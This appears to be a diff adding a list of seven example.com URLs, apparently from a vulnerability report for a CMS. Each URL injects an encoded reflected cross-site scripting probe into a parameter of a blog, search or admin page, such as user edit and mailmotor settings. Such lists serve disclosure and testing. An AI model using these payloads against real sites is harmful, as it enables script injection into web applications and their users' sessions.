@@ -1,0 +1,13 @@
+http://www.example.com/blog/detail/article?utm_source=feed&amp;utm_medium=rss&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;  
+
+http://www.example.com/search?form=search&amp;q_widget=&amp;submit=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt; 
+ 
+http://www.example.com/search?form=search&amp;q_widget=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
+
+http://www.example.com/search?form=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
+
+http://www.example.com/private/en/users/edit?id=1&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
+
+http://www.example.com/private/en/pages/edit?token=true&amp;id=1&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
+ 
+http://www.example.com/private/en/mailmotor/settings?token=&quot;&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt; 
